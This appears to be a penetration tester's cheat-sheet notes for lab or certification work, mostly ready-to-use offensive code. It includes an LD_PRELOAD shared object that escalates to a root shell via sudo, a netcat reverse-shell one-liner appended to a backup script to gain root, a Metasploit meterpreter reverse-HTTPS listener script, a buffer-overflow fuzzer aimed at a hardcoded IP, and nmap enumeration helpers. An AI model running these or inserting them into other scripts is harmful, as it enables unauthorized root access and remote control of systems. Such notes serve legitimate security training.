
[[0_Common_0]] 


### Set Environment Variables:
```bash
#!/bin/bash

# Check if IP address is provided as an argument
if [ -z "$1" ]; then
    echo "Usage: source $0 <IP address>"
    return 1
fi

# Set IP address from the argument
IP="$1"

# Set environment variables
export IP="$IP"
export URL="http://$IP/"
export FURL="http://$IP/FUZZ"
export DURL="http://$IP/FUZZ/"

echo "Environment variables set:"
echo "IP: $IP"
echo "URL: $URL"
echo "FURL: $FURL"
echo "DURL: $DURL"
```
After this is done, remember to set the alias in .bashrc
```bash
alias vars="source /home/s0l0s0j4/SCRIPTS/variables.sh"
```
## AutoEnum with nmap
```bash
#!/bin/bash

# Check if the "targets" file exists
if [ ! -f "targets" ]; then
    echo "Error: 'targets' file not found."
    exit 1
fi

# Read each IP address from the "targets" file
while IFS= read -r ip; do
    # Extract the last octet of the IP address
    last_octet=$(echo "$ip" | awk -F'.' '{print $4}')
    
    # Create a directory for this IP address in the current working directory
    mkdir -p "$last_octet"
    
    # Run the nmap command and redirect output into the folder
    nmap -sC -sV -p- -oN "$last_octet/nmapResults.txt" --open "$ip"
    
    echo "Scanned $ip and saved results in '$last_octet/nmapResults.txt'"
done < "targets"

echo "Scan complete."
```

## LD_PRELOAD 
LD_PRELOAD shell.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
	Then
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
	And finally
```bash
sudo LD_PRELOAD=/home/kali/OSCP/TOOLS/shell.so apache2
```
- you can substitute apache2 for any binary you can run as sudo.
### Add a reverse shell one-liner to a shellscript to get root level reverse shell:
```bash
echo >> user_backups.sh
```
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 
 4444 >/tmp/f" >> user_backups.sh
```

## Windows Listener resource script:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.45.163
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

### Buffer overflow Checker
```python
import socket

def send_data(ip, port, max_attempts=1000):
    attempt = 1
    while attempt <= max_attempts:
        try:
            # Create a socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # Set a timeout for the connection

            # Connect to the server
            s.connect((ip, port))

            # Create the payload
            payload = 'A' * attempt

            # Send the payload
            s.sendall(payload.encode())

            # Receive the response
            response = s.recv(1024).decode()

            # Check if the response is as expected
            if response != "Yup, same old same old here as well...":
                print(f"Server did not return 'Yup, same old same old here as well...' for payload length: {attempt}")
                break

            print(f"Attempt {attempt}: Server returned 'Yup, same old same old here as well...'")
            attempt += 1
            s.close()

        except socket.timeout:
            print(f"Connection timed out for payload length: {attempt}")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            break

if __name__ == "__main__":
    target_ip = "94.237.54.176"  # Replace with the target IP address
    target_port = 50961        # Replace with the target port number

    send_data(target_ip, target_port)
```